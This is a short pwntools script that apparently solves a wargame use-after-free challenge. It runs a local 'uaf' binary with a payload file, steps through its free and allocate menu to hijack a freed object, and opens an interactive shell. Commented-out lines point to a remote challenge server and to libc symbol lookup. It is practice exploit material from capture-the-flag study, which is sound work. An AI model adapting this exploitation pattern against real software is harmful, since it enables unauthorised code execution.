from pwn import *
context(arch='i386',log_level='debug')
p=process(argv=["~/uaf","8","/tmp/zzhanghao/hh"])
# p=process("./orw",env={"LD_PRELOAD":"./libc_32.so.6"})
# p=remote("chall.pwnable.tw",10001)
def  use():
	p.sendlineafter('free\n','1')
 	pass 
def  after():
	p.sendlineafter('free\n','2')
 	pass 
def  free():
	p.sendlineafter('free\n','3')
 	pass 

# gdb.attach(p,"b* 0x000000000401082\nb *0x0000000000400F92\nc")
sleep(2)
free()
after()
after()
use()
# e=ELF('./libc-2.23.so')
# sys_addr=libc_base+e.symbols['system']


p.interactive()